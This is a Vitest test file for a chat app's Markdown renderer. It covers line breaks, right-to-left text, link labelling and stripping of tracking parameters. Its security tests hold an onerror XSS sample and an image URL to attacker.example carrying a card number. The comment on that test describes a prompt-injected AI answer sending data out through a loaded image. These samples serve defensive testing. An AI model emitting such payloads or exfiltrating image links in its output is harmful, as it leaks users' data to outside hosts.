import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import { Markdown } from "@/components/chat/markdown";

const html = (text: string) => renderToStaticMarkup(createElement(Markdown, null, text));

describe("Markdown", () => {
  it("keeps an answer's lines, as GitHub's comments do (found by hand: P2-J1)", () => {
    expect(html("one\ntwo\nthree")).toContain("one<br/>\ntwo<br/>\nthree");
    expect(html("para one\n\npara two")).toContain('<p dir="auto">para one</p>\n<p dir="auto">para two</p>');
  });

  it("lets each block take its direction from its own text, Arabic or Hebrew too (P4-C2)", () => {
    const out = html("مرحبا بالعالم\n\nHello\n\n- שלום\n- עולם\n\n| a |\n| - |\n| ب |");
    expect(out).toContain('<p dir="auto">مرحبا بالعالم</p>');
    expect(out).toContain('<p dir="auto">Hello</p>');
    expect(out).toContain('<ul dir="auto">');
    expect(out).toContain("<li>שלום</li>");
    expect(out).toContain('<td dir="auto">ب</td>');
    // react-markdown's syntax-tree node never reaches the page
    expect(out).not.toContain("node=");
  });

  it("says where a link goes when its text names another site (P5-C9)", () => {
    expect(html("[bbc.co.uk](https://bbc-news.example/story)")).toContain("(goes to bbc-news.example)");
    expect(html("[bbc.co.uk](https://www.bbc.co.uk/news)")).not.toContain("goes to");
    expect(html("[the notes](https://example.com/notes)")).not.toContain("goes to");
  });

  it("renders no raw HTML, and opens links apart from the page without tracking", () => {
    expect(html('<img src=x onerror="alert(1)">')).not.toContain("<img");
    expect(html("[Valkey](https://valkey.io/?utm_source=openai)")).toContain(
      '<a href="https://valkey.io/" target="_blank" rel="noopener noreferrer nofollow">Valkey</a>',
    );
  });
});

describe("an answer's images", () => {
  it("shows one from another site as a link, never loading it (an injected answer can't send data out: P3-E2)", () => {
    const shown = html("![weather map](https://attacker.example/pixel.png?card=LIB-1234)");
    expect(shown).not.toContain("<img");
    expect(shown).toContain("Image: weather map");
    expect(shown).toMatch(/<a href="https:\/\/attacker\.example\/pixel\.png\?card=LIB-1234" target="_blank" rel="noopener noreferrer nofollow">/);
  });

  it("loads one from Gen9 itself only: a protocol-relative address is another site, and data: is dropped", () => {
    expect(html("![chart](/api/threads/x/files/y)")).toContain('<img src="/api/threads/x/files/y" alt="chart"/>');
    expect(html("![x](//attacker.example/p.png)")).not.toContain("<img");
    const inline = html("![dot](data:image/png;base64,iVBOR)");
    expect(inline).not.toContain("<img");
    expect(inline).not.toContain("<a");
    expect(inline).toContain("Image: dot");
  });
});
